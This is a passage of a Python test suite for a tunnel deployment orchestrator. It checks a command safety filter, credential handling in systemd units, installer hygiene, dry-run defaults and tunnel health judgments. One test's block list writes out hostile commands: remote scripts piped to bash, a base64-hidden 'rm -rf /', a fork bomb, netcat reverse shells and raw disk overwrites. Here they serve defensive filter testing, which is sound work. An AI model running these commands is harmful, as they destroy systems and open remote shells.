        class MockReq:
            def __init__(self, body_dict):
                self.body = json.dumps(body_dict).encode("utf-8")
                self.headers = {
                    "X-Best-Tunnel-CSRF": "1",
                    "Host": "127.0.0.1:8800",
                    "Content-Type": "application/json",
                    "Content-Length": str(len(self.body))
                }
                self.rfile = io.BytesIO(self.body)
                self.wfile = io.BytesIO()
                self.path = path
                self.response_code = None

            check_csrf = dashboard.H.check_csrf

            def send_response(self, code): self.response_code = code
            def send_header(self, k, v): pass
            def end_headers(self): pass

        handler = MockReq(payload)
        dashboard.H.do_POST(handler)
        return {"code": handler.response_code,
                "body": json.loads(handler.wfile.getvalue().decode("utf-8"))}

    def test_36_safety_blocklist_coverage_and_false_positives(self):
        """Gate-B B4 Acceptance Test: the extended blocklist stops the destructive classes it claims to,
        without breaking any command this orchestrator legitimately generates."""
        must_block = [
            "reboot",
            "shutdown -h now",
            "poweroff",
            "init 0",
            "systemctl stop sshd",
            "systemctl disable ssh.service",
            "curl -fsSL https://example.invalid/i.sh | bash",
            "wget -qO- https://example.invalid/i.sh | sudo sh",
            "echo cm0gLXJmIC8= | base64 -d | bash",
            ":(){ :|:& };:",
            "nc 203.0.113.20 4444 -e /bin/sh",
            "ncat 203.0.113.20 4444 -e /usr/bin/bash",
            "echo payload > /dev/sda",
            "cat img.raw > /dev/nvme0n1",
            "rm -rf --no-preserve-root /",
            "crontab -r",
            "chattr +i /etc/resolv.conf",
            "iptables -P INPUT DROP",
            "ip6tables -P FORWARD DROP",
            "userdel deploy",
            "usermod -L deploy",
            "passwd -l root",
            "echo 'evil' > /etc/ssh/sshd_config",
            "rm -rf /etc/ssh/",
        ]
        for cmd in must_block:
            self.assertFalse(safety.check_command_safe(cmd), f"NOT BLOCKED: {cmd}")

        # Commands this project actually emits, including every root installer and the probe writer.
        must_allow = [
            "ip link set grep7 down",
            "ip link del grep7",
            "systemctl restart best-tunnel-prod-p7-gre",
            "systemctl stop best-tunnel-prod-p7-gre",
            "systemctl daemon-reload",
            "systemctl is-active best-tunnel-prod-p7-wstunnel-server",
            probe.install_script(),
            probe.stability_cmd("203.0.113.20", 8897),
            probe.cmd("ladder", "203.0.113.20", 8897, "/test_1m", 1048576, 20),
            'curl -fsSL --retry 3 --max-time 120 -o "$out" "$src"',
            'wget -q --tries=3 --timeout=120 -O "$out" "$src"',
            'sha256sum "frp-v0.71.0.tar.gz"',
            'trap \'rm -rf "$TMP_DIR"\' EXIT',
            "mktemp -d /tmp/best_tunnel_frp_XXXXXX",
            "apt-get install -y -qq iperf3",
            "ln -sf /usr/bin/kcptun-server /usr/local/bin/kcptun-server",
            "iptables -P INPUT ACCEPT",
            "iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.10.17.2",
            "rm -f /tmp/best* /tmp/test*",
            "fuser -k 443/tcp 2>/dev/null || true",
            "umask 077; cat > /etc/best-tunnel/frp/prod-frps-p7.toml <<'EOF'\nbindPort = 7000\nEOF\nchmod 600 /etc/best-tunnel/frp/prod-frps-p7.toml",
            # Derived from the writer itself rather than typed out, so this line cannot drift into
            # asserting that a command nobody issues is allowed.
            mock_ssh.file_write_command("/etc/best-tunnel/esp/prod-p7-iran.batch"),
            "ss -tlnp | grep -E ':443 '",
            "journalctl -u best-tunnel-prod-p7-gre -n 200 --no-pager",
            "useradd -r -s /usr/sbin/nologin tunnel",
            "iptables -A INPUT -p tcp --dport 443 -j ACCEPT -m comment --comment best-tunnel-7-GRE",
        ]
        for cmd in must_allow:
            self.assertTrue(safety.check_command_safe(cmd), f"FALSE POSITIVE: {cmd[:80]}")

        # Every teardown and setup command the generators emit must also pass the filter.
        for proto in protocols.ALL_PROTOCOLS:
            plan = protocols.generate_deployment(proto, 72, "198.51.100.10", "203.0.113.20", 443)
            for cmd in (plan.get("iran_cmds", []) + plan.get("foreign_cmds", [])
                        + plan.get("teardown_iran", []) + plan.get("teardown_foreign", [])):
                self.assertTrue(safety.check_command_safe(cmd), f"{proto}: generator emits a blocked command: {cmd[:90]}")

    def test_37_chisel_and_wstunnel_credential_wiring(self):
        """Gate-B B1 Acceptance Test: chisel and wstunnel both read their secret from their own
        environment. The server and client use different variable names for the same value, and
        neither name nor value appears in ExecStart=."""
        pair_id = 73
        ir_ip, fr_ip, frontend = "198.51.100.10", "203.0.113.20", 443

        # --- chisel: server keeps --authfile (a path, not a secret); client uses AUTH from env ---
        ch = protocols.generate_deployment("chisel-wss", pair_id, ir_ip, fr_ip, frontend)
        srv_unit = ch["iran_files"][f"/etc/systemd/system/best-tunnel-prod-p{pair_id}-chisel-server.service"]
        cln_unit = ch["foreign_files"][f"/etc/systemd/system/best-tunnel-prod-p{pair_id}-chisel-client.service"]
        env_content = ch["foreign_files"][f"/etc/best-tunnel/chisel/prod-env-p{pair_id}"]
        auth_json = json.loads(ch["iran_files"][f"/etc/best-tunnel/chisel/prod-auth-p{pair_id}.json"])

        self.assertIn("--authfile", srv_unit)
        self.assertNotIn("--auth ", cln_unit)
        self.assertNotIn("--auth=", cln_unit)
        self.assertTrue(env_content.startswith("AUTH="))
        # The schema is what the live host rejected: chisel reads --authfile as
        # map[string][]string, {"<user:pass>": ["<remote-addr-regex>", ...]}, and the users-keyed
        # array of username/password objects used to fail with "Invalid JSON" at server start while
        # this test still passed. Asserting the parsed shape is the closest an offline run can come
        # to asking the binary itself.
        self.assertNotIn("users", auth_json, "chisel has no users/username authfile schema")
        self.assertEqual(len(auth_json), 1, "one credential, one entry")
        (key, allow), = auth_json.items()
        self.assertRegex(key, r"^tun\d+:[A-Za-z0-9]{16,}$")
        self.assertIsInstance(allow, list)
        self.assertTrue(allow, "an empty allowlist would deny every remote")
        self.assertTrue(all(isinstance(a, str) for a in allow))
        user, pwd = key.split(":", 1)
        self.assertEqual(env_content.strip(), f"AUTH={user}:{pwd}")
        self.assertNotIn(pwd, cln_unit)
        self.assertNotIn(pwd, srv_unit)
        self.assertIn(f"EnvironmentFile=/etc/best-tunnel/chisel/prod-env-p{pair_id}", cln_unit)

        # --- wstunnel: server and client read different WSTUNNEL_* names carrying the same secret ---
        ws = protocols.generate_deployment("wstunnel-v10", pair_id, ir_ip, fr_ip, frontend)
        env_path = f"/etc/best-tunnel/wstunnel/prod-env-p{pair_id}"
        srv_unit = ws["iran_files"][f"/etc/systemd/system/best-tunnel-prod-p{pair_id}-wstunnel-server.service"]
        cln_unit = ws["foreign_files"][f"/etc/systemd/system/best-tunnel-prod-p{pair_id}-wstunnel-client.service"]
        ir_env = ws["iran_files"][env_path]
        fr_env = ws["foreign_files"][env_path]

        self.assertTrue(ir_env.startswith("WSTUNNEL_RESTRICT_HTTP_UPGRADE_PATH_PREFIX="))
        self.assertTrue(fr_env.startswith("WSTUNNEL_HTTP_UPGRADE_PATH_PREFIX="))
        ir_secret = ir_env.splitlines()[0].split("=", 1)[1]
        fr_secret = fr_env.splitlines()[0].split("=", 1)[1]
        # Parsed per line on purpose: the client env also carries SSL_CERT_FILE, and splitting the
        # whole file on the first "=" would compare "<secret>\nSSL_CERT_FILE=..." against the secret.
        self.assertEqual(ir_secret, fr_secret, "Server and client must agree on the upgrade path prefix")
        self.assertGreaterEqual(len(ir_secret), 16)

        self.assertNotIn("--restrict-http-upgrade-path-prefix", srv_unit)
        self.assertNotIn("--http-upgrade-path-prefix", cln_unit)
        self.assertNotIn(ir_secret, srv_unit)
        self.assertNotIn(fr_secret, cln_unit)
        self.assertIn(f"EnvironmentFile={env_path}", srv_unit)
        self.assertIn(f"EnvironmentFile={env_path}", cln_unit)

    def test_38_mirror_fallback_and_installer_hygiene(self):
        """Management ruling on B2: GitHub is tried first, mirrors are a fallback, and the pinned
        hash is what authorises the bytes - never the source they arrived from.

        Also covers two defects the standalone installers carried into this round: CRLF line
        endings (bash on Debian will not run them) and a chisel credential on ExecStart.
        """
        # 1. Source ordering. GitHub must be first so a third-party mirror is only ever contacted
        #    when the official host is unreachable, and so the mirror learns this host's address
        #    in the rare case rather than on every install.
        url = binary_manager.get_download_url("chisel", "v1.10.1")
        cands = binary_manager.download_candidates(url)
        self.assertEqual(cands[0], url, "The official release URL must be the first candidate")
        self.assertEqual(len(cands), 1 + len(binary_manager.MIRROR_PREFIXES))
        self.assertEqual(cands[1:], [f"{p}{url}" for p in binary_manager.MIRROR_PREFIXES])

        # 2. The generated installer offers every candidate and still passes the safety filter as a
        #    whole script, not just as isolated command strings.
        script = binary_manager.generate_secure_install_script("chisel")
        for cand in cands:
            self.assertIn(f'"{cand}"', script, f"Generated script is missing candidate {cand}")
        self.assertLess(script.index(f'"{url}"'), script.index(f'"{cands[1]}"'),
                        "GitHub must be attempted before any mirror")
        self.assertLess(script.index("fetch "), script.index("EXPECTED_HASH="),
                        "Download must precede verification, and verification must not be skippable")
        self.assertTrue(safety.check_command_safe(script))

        # 3. The standalone installers carry the identical fallback, derived from the same constant
        #    so the two download paths cannot drift apart.
        canonical = verify_checksums.canonical_mirror_loop()
        self.assertIn('"$URL"', canonical)
        for prefix in binary_manager.MIRROR_PREFIXES:
            self.assertIn(prefix.rstrip("/"), canonical)
        root = verify_checksums.REPO_ROOT
        downloaders = []
        for name in sorted(os.listdir(root)):
            if not name.endswith(".sh"):
                continue
            with open(os.path.join(root, name), "rb") as fh:
                raw = fh.read()
            self.assertNotIn(b"\r\n", raw, f"{name}: CRLF line endings break bash on Linux")
            if b"/releases/download/" in raw:
                downloaders.append(name)
                self.assertIn(canonical.encode(), raw, f"{name}: mirror fallback drifted from binary_manager")
        self.assertEqual(len(downloaders), 10, "Expected 10 downloading installers")

        # 4. The hygiene audit passes against the real repository.
        self.assertEqual(verify_checksums.audit_installer_hygiene(), [])

        # 5. Negative control: an audit that cannot fail proves nothing. Each defect class must be
        #    reported, otherwise step 4 above is vacuous.
        tmp = tempfile.mkdtemp(prefix="hygiene_negctl_")
        self.addCleanup(shutil.rmtree, tmp, True)
        defects = {
            "crlf.sh": 'URL="https://github.com/a/b/releases/download/v1/x.gz"\r\necho hi\r\n',
            "nomirror.sh": 'URL="https://github.com/a/b/releases/download/v1/x.gz"\ncurl -fsSL -o x "$URL"\n',
            "argvleak.sh": "ExecStart=/usr/local/bin/chisel server --auth $CH_USER:$CH_PASS\n",
            "skipverify.sh": "ExecStart=/usr/local/bin/chisel client --tls-skip-verify https://x\n",
            "strayloop.sh": 'for u in "$URL"; do echo $u; done\n',
            # A tunnel credential written with no umask, and one written after the umask was relaxed
            # back to 022: both leave the token readable by every local user.
            "worldreadable.sh": 'cat > /etc/x/c.toml <<EOF\ntoken = "$BH_TOKEN"\nEOF\n',
            "umaskreset.sh": 'umask 077\numask 022\ncat > /etc/x/c.toml <<EOF\ntoken = "$R_TOKEN"\nEOF\n'
                             'chmod 600 /etc/x/c.toml\n',
            # Go rejects CN-only certificates, so a serving cert without a SAN cannot be verified at
            # all - which is precisely how the --tls-skip-verify this round removed originally arose.
            "nosan.sh": 'openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -nodes '
                        '-subj "/CN=198.51.100.10"\n',
            # A routable address committed instead of taken from the environment. This is not a
            # hypothetical: two GRE installers carried one until this round, and the audit that
            # claimed the tree was clean had only searched for two *specific* known addresses.
            # Built from octets so this fixture does not itself trip the rule it is testing.
            "liveaddr.sh": 'KH_PUB="{}"   # public IP of peer\n'.format(".".join(["199", "9", "9", "1"])),
            # A config in a schema the binary cannot parse: chisel reads its authfile as
            # map[string][]string and exits 1 on this users-keyed form. Assembled by substitution so
            # the fixture text itself does not trip the rule it tests, as with liveaddr.sh above.
            "badauthfile.sh": '{"USERKEY": [{"username": "u1", "password": "p1"}]}\n'.replace(
                "USERKEY", "users"),
        }
        for name, content in defects.items():
            with open(os.path.join(tmp, name), "w", newline="") as fh:
                fh.write(content)
        original_root = verify_checksums.REPO_ROOT
        verify_checksums.REPO_ROOT = tmp
        try:
            with contextlib.redirect_stdout(io.StringIO()):
                found = verify_checksums.audit_installer_hygiene()
        finally:
            verify_checksums.REPO_ROOT = original_root
        joined = "\n".join(found)
        for name in defects:
            self.assertIn(name, joined, f"audit failed to report the defect planted in {name}")
        self.assertIn("CRLF", joined)
        self.assertIn("canonical GitHub-first mirror fallback", joined)
        self.assertIn("--auth", joined)
        self.assertIn("disables TLS verification", joined)
        self.assertIn("umask in effect at the write is None", joined)
        self.assertIn("umask in effect at the write is '022'", joined)
        self.assertIn("no subjectAltName", joined)

        # 6. Every credential-bearing config in the real installers is written under umask 077 and
        #    explicitly chmod 600, matching the orchestrator path (engine.py:345, failover.py:238).
        hardened = 0
        for name in sorted(os.listdir(root)):
            if not name.endswith(".sh"):
                continue
            with open(os.path.join(root, name), encoding="utf-8") as fh:
                text = fh.read()
            for target, _start, end in verify_checksums.secret_config_writes(text):
                hardened += 1
                self.assertIn(f"chmod 600 {target}", text, f"{name}: {target} is not chmod 600")
        self.assertEqual(hardened, 10, "Expected 10 credential-bearing config writes across the installers")

        # 7. No credential and no disabled TLS check survives on any real ExecStart line.
        for name in sorted(os.listdir(root)):
            if not name.endswith(".sh"):
                continue
            with open(os.path.join(root, name), encoding="utf-8") as fh:
                text = fh.read()
            for line in text.splitlines():
                stripped = line.strip()
                if not stripped.startswith("ExecStart="):
                    continue
                self.assertIsNone(re.search(r"--auth(?![A-Za-z-])", stripped), f"{name}: {stripped[:90]}")
                self.assertNotIn("tls-skip-verify", stripped, f"{name}: {stripped[:90]}")
                self.assertIsNone(verify_checksums.CREDENTIAL_VAR_RE.search(stripped), f"{name}: {stripped[:90]}")

        # 8. Every self-signed serving certificate issued by an installer carries an IP SAN, and the
        #    credential that authenticates the transport is not the only secret on the line.
        san_lines = 0
        for name in sorted(os.listdir(root)):
            if not name.endswith(".sh"):
                continue
            with open(os.path.join(root, name), encoding="utf-8") as fh:
                for line in fh:
                    if "openssl req -x509" in line:
                        san_lines += 1
                        self.assertIn("subjectAltName=IP:", line, f"{name}: {line.strip()[:110]}")
        self.assertEqual(san_lines, 6, "chisel, frp, backhaul and gost each issue one serving "
                                       "certificate (gost joined the list with F4, when its "
                                       "client stopped skipping verification and needed a "
                                       "certificate worth pinning), plus install.sh's hub IP "
                                       "certificate issued twice: initial issuance and the "
                                       "auto-renewal script")

    def test_39_operational_data_stays_outside_the_repo(self):
        """BEST_TUNNEL_DB_PATH must move every live-session write out of the working tree.

        SSH TOFU pins the host *address* on first connection, so a repo-local database collects
        real server addresses as a side effect of simply using the tool. The in-repo default must
        keep working (tests and offline runs assume it), and the override must be absolute.
        """
        repo_db = os.path.join(os.path.dirname(__file__), "best_tunnel.db")
        probe_addr = "203.0.113.99"
        # storage.init_db() runs at import time, so the resolution probe below necessarily creates the
        # in-repo default. Remember whether it was already there: leaving an empty one behind means the
        # next live run that forgets BEST_TUNNEL_DB_PATH has a database ready to collect real addresses.
        existed_before = os.path.isfile(repo_db)

        # 1. Resolution: unset keeps the historical in-repo path, set overrides it. Resolved at
        #    import time, so each case needs a fresh interpreter.
        code = ("import storage,sys;sys.stdout.write(storage.DB_PATH)")
        env = dict(os.environ)
        env.pop("BEST_TUNNEL_DB_PATH", None)
        default_path = subprocess.run([sys.executable, "-c", code], cwd=os.path.dirname(__file__),
                                      env=env, capture_output=True, text=True, check=True).stdout.strip()
        self.assertEqual(os.path.realpath(default_path), os.path.realpath(repo_db),
                         "in-repo default must not move")

        with tempfile.TemporaryDirectory() as outside:
            target = os.path.join(outside, "live.db")
            env["BEST_TUNNEL_DB_PATH"] = target
            overridden = subprocess.run([sys.executable, "-c", code], cwd=os.path.dirname(__file__),
                                        env=env, capture_output=True, text=True, check=True).stdout.strip()
            self.assertEqual(os.path.realpath(overridden), os.path.realpath(target))
            self.assertFalse(os.path.realpath(overridden).startswith(
                os.path.realpath(os.path.dirname(os.path.dirname(__file__)))),
                "override must land outside the repository")

            # 2. Containment: a TOFU pin plus its audit line write the address exactly once, into
            #    the external database, and leave the repo file byte-identical.
            before = binary_manager.compute_file_sha256(repo_db) if os.path.isfile(repo_db) else None
            saved = storage.DB_PATH
            try:
                storage.DB_PATH = target
                storage.init_db()
                mock_ssh.TOFUHostKeyPolicy().missing_host_key(
                    FakeClient(port=22), probe_addr, FakeKey("ssh-ed25519", "AAAAC3NzaC1lZDIvExternal"))
                self.assertIsNotNone(storage.get_pinned_host_key(probe_addr, 22))
                with storage.db_session() as conn:
                    rows = conn.execute("SELECT details FROM audit_logs WHERE action = 'SSH_TOFU'").fetchall()
                self.assertEqual(len(rows), 1, "pin event and its audit line must both persist")
                # The event must be recorded; the address inside its free text must not be. The
                # containment this test is about is the repository, and the address column of
                # host_keys is functional data the tool needs to verify the pin next time.
                self.assertNotIn(probe_addr, rows[0]["details"],
                                 "an audit detail line that quotes the address it addressed leaks it "
                                 "into every report written from this table (test_47)")
                self.assertIn("[addr]", rows[0]["details"], rows[0]["details"])
                with storage.db_session() as conn:
                    pinned_hosts = [r["hostname"] for r in conn.execute("SELECT hostname FROM host_keys")]
                self.assertIn(probe_addr, pinned_hosts)
            finally:
                storage.DB_PATH = saved

            if before is not None:
                self.assertEqual(binary_manager.compute_file_sha256(repo_db), before,
                                 "live-session writes must not touch the repository database")
                # `with sqlite3.connect(...)` commits but does not close, and an open handle on Windows
                # is what keeps the probe database - and its -wal/-shm - undeletable below.
                ro = sqlite3.connect(f"file:{repo_db}?mode=ro", uri=True)
                try:
                    leaked = ro.execute("SELECT COUNT(*) FROM host_keys WHERE hostname = ?",
                                        (probe_addr,)).fetchone()[0]
                finally:
                    ro.close()
                self.assertEqual(leaked, 0, "repo database must not learn the probe address")

        if not existed_before:
            for suffix in ("", "-wal", "-shm"):
                try:
                    os.remove(repo_db + suffix)
                except OSError:
                    pass
        if existed_before:
            self.assertTrue(os.path.exists(repo_db),
                            "a database the suite did not create must survive it")
        else:
            self.assertFalse(os.path.exists(repo_db),
                             "the probe must not leave a repo-tree database that the next live run, "
                             "started without BEST_TUNNEL_DB_PATH, would fill with real addresses")

    def test_40_env_file_sourcing_survives_crlf_and_a_missing_final_newline(self):
        """The operator hands credentials over as a shell-sourced env file, so two editor
        artefacts must not silently change what the tool reads.

        Whether CRLF is survivable for `source` depends on the shell: Git Bash (MSYS)
        translates CRLF on read and drops the trailing CR of an assignment, while POSIX
        bash keeps the CR inside the value - step 1 pins each platform's own answer
        instead of assuming the author's. A file without a final newline loses its last
        line in every `while read` loop on both - and
        BEST_TUNNEL_DRY_RUN, the switch that arms destructive root commands, is the line an editor
        tends to put last. What must never happen is a *silent* difference between readers.
        """
        if BASH is None:
            self.skipTest("bash is not available")
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "live.env")
            with open(p, "wb") as fh:
                fh.write(b"IR_HOST=198.51.100.10\r\nIR_PASS=placeholder-not-a-secret\r\n"
                         b"BEST_TUNNEL_DRY_RUN=0")

            # 1. `source` delivers each platform's exact values. Under Git Bash there is
            #    no CR glued to any of them; under POSIX bash the CR is part of every
            #    value and only looks like a newline here because the harness decodes
            #    subprocess output with universal newlines (T2: this step used to assert
            #    the Git Bash answer unconditionally, so the suite failed on Linux for a
            #    difference that is the shell's, not the file's - and not the product's,
            #    whose readers take the switch from the environment either way).
            got = bash_out('set -a; . "$1"; set +a; printf "%s|%s|%s" "$IR_HOST" "$IR_PASS" "$BEST_TUNNEL_DRY_RUN"', p)
            if os.name == "nt":
                self.assertEqual(got, "198.51.100.10|placeholder-not-a-secret|0")
            else:
                self.assertEqual(got, "198.51.100.10\n|placeholder-not-a-secret\n|0")

            # 2. The shell read-loop silently drops that same last line.
            counted = bash_out('n=0; while IFS= read -r l; do n=$((n+1)); done < "$1"; echo $n', p)
            self.assertEqual(int(counted.strip()), 2,
                             "a missing final newline hides the last variable from `while read`")

            # 3. Python iteration does not drop it, so the two readers disagree - which is how an
            #    audit of the file can conclude the dry-run switch is absent when it is present.
            with open(p, encoding="utf-8") as fh:
                names = [ln.split("=", 1)[0].strip() for ln in fh if "=" in ln]
            self.assertEqual(names, ["IR_HOST", "IR_PASS", "BEST_TUNNEL_DRY_RUN"])
            self.assertNotEqual(len(names), int(counted.strip()))

            # 4. Either way the resolver is fail-safe: only an explicit 0 arms live mode. Asserted in
            #    an env that does not already carry the switch, because `source` cannot unset a variable
            #    the parent shell exported - an operator running this suite from a live shell would
            #    otherwise read that shell's value and blame the file.
            with env_vars(BEST_TUNNEL_DRY_RUN=None):
                with open(p, "wb") as fh:
                    fh.write(b"IR_HOST=198.51.100.10\r\nIR_PASS=placeholder-not-a-secret\r\n")
                armed = bash_out('set -a; . "$1"; set +a; echo "${BEST_TUNNEL_DRY_RUN:-absent}"', p)
                self.assertEqual(armed.strip(), "absent")
                self.assertTrue(mock_ssh.is_dry_run_enabled(), "absent switch must mean dry-run")

    def test_41_dry_run_is_the_default_and_only_explicit_live_tokens_arm_it(self):
        """A sourced env file carrying BEST_TUNNEL_DRY_RUN=0 arms destructive root commands for
        every later command in that shell. Pin the resolver's truth table: only an explicit live
        token may leave dry-run, so neither an empty value nor a misspelling can fail open.
        """
        cases = [(None, True), ("", True), ("junk", True), ("ture", True), ("maybe", True),
                 ("1", True), ("true", True), ("yes", True), ("TRUE", True), (" 1 ", True),
                 ("0", False), ("false", False), ("no", False), ("off", False), ("OFF", False),
                 (" 0 ", False)]
        for value, expects_dry in cases:
            with env_vars(BEST_TUNNEL_DRY_RUN=value):
                self.assertEqual(mock_ssh.is_dry_run_enabled(), expects_dry,
                                 f"BEST_TUNNEL_DRY_RUN={value!r} -> dry_run must be {expects_dry}")
        # The SSH factory and the HTTP layer must resolve it identically - the two readers used to
        # disagree, which put one of them in live mode while the other stayed mocked.
        for value, expects_dry in cases:
            with env_vars(BEST_TUNNEL_DRY_RUN=value):
                self.assertEqual(dashboard.is_dry_run(), mock_ssh.is_dry_run_enabled(),
                                 f"dashboard and mock_ssh disagree on BEST_TUNNEL_DRY_RUN={value!r}")

    def test_42_dial_host_separates_the_tunnel_peer_from_the_management_address(self):
        """Live finding, §7.7 step 3: the two test hosts drop direct TCP between their public
        addresses in both directions, including port 22, while IP protocol 47 passes. A pair could
        only carry one address per side, used both to SSH in and as the address every transport
        dials and every certificate names, so an underlay deployment was inexpressible - and
        run_all_benchmarks could not do it even in principle, because it opens its SSH runner from
        the same field it pings for the base RTT.
        """
        ir_pub, fr_pub, ir_tun, fr_tun = "198.51.100.10", "203.0.113.20", "10.10.11.1", "10.10.11.2"
        self.assertEqual(protocols.dial_address({"host": ir_pub}), ir_pub,
                         "unset dial_host must leave every existing pair behaving exactly as before")
        self.assertEqual(protocols.dial_address({"host": ir_pub, "dial_host": ir_tun}), ir_tun)

        # benchmarks rows carry a foreign key to pairs, so the sweep below needs a real row.
        pid = storage.add_pair(name=f"dial_split_{int(time.time() * 1000)}", iran_host=ir_pub,
                               foreign_host=fr_pub, frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        plain = {"id": pid, "name": "dial_split", "frontend": 9443, "frontend_port": 9443,
                 "iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22}}
        split = {"id": pid, "name": "dial_split", "frontend": 9443, "frontend_port": 9443,
                 "iran": {"host": ir_pub, "port": 22, "dial_host": ir_tun},
                 "foreign": {"host": fr_pub, "port": 22, "dial_host": fr_tun},
                 "active_tunnel": "chisel-wss", "base_rtt_ms": 0.0}

        def written(pair, proto="chisel-wss"):
            ir_m = mock_ssh.MockSSHClient(host_role="iran")
            fr_m = mock_ssh.MockSSHClient(host_role="foreign")
            res = engine.deploy_tunnel(pair=pair, choice=proto, dry_run=False,
                                       force_confirmed=True, ir_runner=ir_m, fr_runner=fr_m)
            self.assertTrue(res["ok"], f"deploy of {proto} failed: {res}")
            return {p: c for m in (ir_m, fr_m) for p, c in m.state["files"].items()}

        # 1. Without dial_host nothing has moved.
        self.assertIn(ir_pub, "".join(written(plain).values()),
                      "with one address per side, the peer the transport dials is still that address")

        # 2. With it, no config written to a host may name the management address as a peer: every
        #    dial target, forward destination and firewall source on the data path is the underlay.
        files = written(split)
        joined = "".join(files.values())
        self.assertIn(f"https://{ir_tun}", joined, "the client must dial the underlay address")
        for path, content in files.items():
            self.assertNotIn(ir_pub, content, f"{path} still names Iran's management address as a peer")
            self.assertNotIn(fr_pub, content, f"{path} still names Foreign's management address")

        # 3. The engine's own entry points must all resolve the peer the same way. Spying the
        #    generators shows which addresses reached them without re-implementing the sweep.
        seen_dep, seen_bench, seen_rtt = [], [], []
        real_dep, real_bench, real_rtt = (protocols.generate_deployment,
                                          protocols.generate_benchmark_plan,
                                          engine.measure_direct_base_rtt)
        real_supported = protocols.get_supported_protocols
        protocols.generate_deployment = (
            lambda proto, pid, ir_ip, fr_ip, frontend:
            (seen_dep.append((ir_ip, fr_ip)), real_dep(proto, pid, ir_ip, fr_ip, frontend))[1])
        protocols.generate_benchmark_plan = (
            lambda proto, pid, ir_ip, fr_ip, **kw:
            (seen_bench.append((ir_ip, fr_ip)), real_bench(proto, pid, ir_ip, fr_ip, **kw))[1])
        engine.measure_direct_base_rtt = (
            lambda runner, fr_ip, dry_run=True:
            (seen_rtt.append(fr_ip), real_rtt(runner, fr_ip, dry_run=dry_run))[1])
        protocols.get_supported_protocols = lambda: ["chisel-wss"]
        try:
            # run_all_benchmarks in dry-run to reach its pre-phase: it is the only caller that pings
            # for the base RTT before anything is deployed, and it builds its SSH runner from the
            # same pair field, which is exactly where the two addresses used to collide.
            engine.run_all_benchmarks(split, dry_run=True)
            # Then the real benchmark body, with mock runners, to reach the plan it instruments.
            ir_b = mock_ssh.MockSSHClient(host_role="iran")
            fr_b = mock_ssh.MockSSHClient(host_role="foreign")
            engine.run_single_benchmark(split, "chisel-wss", dry_run=False, ir_runner=ir_b,
                                        fr_runner=fr_b, base_rtt=0.0)
            ir_m = mock_ssh.MockSSHClient(host_role="iran")
            fr_m = mock_ssh.MockSSHClient(host_role="foreign")
            failover.TunnelHealthChecker.check_health(ir_m, fr_m, split, "chisel-wss", dry_run=True)
            mgr = failover.FailoverManager(min_interval_seconds=180, max_failovers_per_window=3)
            mgr.execute_failover(split, "chisel-wss", "wstunnel-v10", reason="test", dry_run=True,
                                 ir_runner=ir_m, fr_runner=fr_m)
        finally:
            protocols.generate_deployment = real_dep
            protocols.generate_benchmark_plan = real_bench
            engine.measure_direct_base_rtt = real_rtt
            protocols.get_supported_protocols = real_supported

        for name, seen, expected in (("deployment plans", seen_dep, {ir_tun, fr_tun}),
                                     ("benchmark plans", seen_bench, {ir_tun, fr_tun}),
                                     ("base RTT pings", seen_rtt, {fr_tun})):
            flat = {a for entry in seen for a in (entry if isinstance(entry, tuple) else (entry,))}
            self.assertTrue(flat, f"nothing reached {name} - the spy proves nothing")
            self.assertEqual(flat - expected, set(),
                             f"{name} were built with {flat}, not the underlay the tunnel must use")

        # The exemption in the other direction: GRE is what builds the underlay, so its peer has to be
        # the outer endpoint. A pair that could not do that would route the tunnel inside itself.
        gre_ir = mock_ssh.MockSSHClient(host_role="iran")
        gre_fr = mock_ssh.MockSSHClient(host_role="foreign")
        self.assertTrue(engine.deploy_tunnel(pair=split, choice="GRE", dry_run=False,
                                             force_confirmed=True, ir_runner=gre_ir,
                                             fr_runner=gre_fr)["ok"])
        # Both ends write the same unit path, so compare each side's own copy rather than a merge.
        ir_gre = "".join(gre_ir.state["files"].values())
        fr_gre = "".join(gre_fr.state["files"].values())
        self.assertIn(f"mode gre remote {fr_pub} local {ir_pub}", ir_gre,
                      "Iran's GRE endpoint must be Foreign's public address")
        self.assertIn(f"mode gre remote {ir_pub} local {fr_pub}", fr_gre,
                      "Foreign's GRE endpoint must be Iran's public address")
        for side, cfg in (("iran", ir_gre), ("foreign", fr_gre)):
            self.assertNotIn(f"remote {ir_tun}", cfg, f"{side}: GRE cannot peer at a GRE underlay address")
            self.assertNotIn(f"remote {fr_tun}", cfg, f"{side}: GRE cannot peer at a GRE underlay address")

    def test_43_unmeasured_base_rtt_must_not_be_judged_as_a_degraded_tunnel(self):
        """Live finding, §7.7 step 6: /api/failover/check on a working chisel tunnel returned
        DEGRADED with loss=0.0% while every unit and the listener were active, because
        overhead = l7_latency / base_rtt exceeded 2.5x against a base_rtt that had never been
        measured - the checker fell back to 42ms - and anything other than HEALTHY starts a
        switchover. The numbers below are the ones measured on the live pair: 380ms through the
        tunnel, 37.7ms of ICMP rtt on the underlay.
        """
        ir_pub, fr_pub = "198.51.100.10", "203.0.113.20"
        pair = {"id": 98, "name": "rtt_default", "frontend": 9443, "frontend_port": 9443,
                "iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22},
                "base_rtt_ms": 0.0, "active_tunnel": "chisel-wss"}
        ir_m, fr_m = mock_ssh.MockSSHClient(host_role="iran"), mock_ssh.MockSSHClient(host_role="foreign")
        ir_m.state["services"]["best-tunnel-prod-p98-chisel-server"] = "active"
        fr_m.state["services"]["best-tunnel-prod-p98-chisel-client"] = "active"
        ir_m.state["listeners"][9443] = "tunnel_client"
        ir_m.state["packet_loss"] = 0.0
        ir_m.state["latency"] = 380.0

        rep = failover.TunnelHealthChecker.check_health(ir_m, fr_m, pair, "chisel-wss", dry_run=True)
        self.assertEqual(rep.loss_pct, 0.0)
        self.assertEqual(rep.status, "HEALTHY",
                         f"a tunnel with no baseline recorded was judged {rep.status} on a guessed "
                         f"42ms: {rep.details}")
        self.assertIn("no baseline", rep.details, "the operator must be able to see why overhead was ignored")

        # With a real baseline the same latency is a real problem, and still has to be reported.
        pair["base_rtt_ms"] = 37.7
        rep2 = failover.TunnelHealthChecker.check_health(ir_m, fr_m, pair, "chisel-wss", dry_run=True)
        self.assertEqual(rep2.status, "DEGRADED",
                         f"10x over a measured baseline must degrade: {rep2.details}")
        self.assertGreater(rep2.overhead_ratio, 2.5)

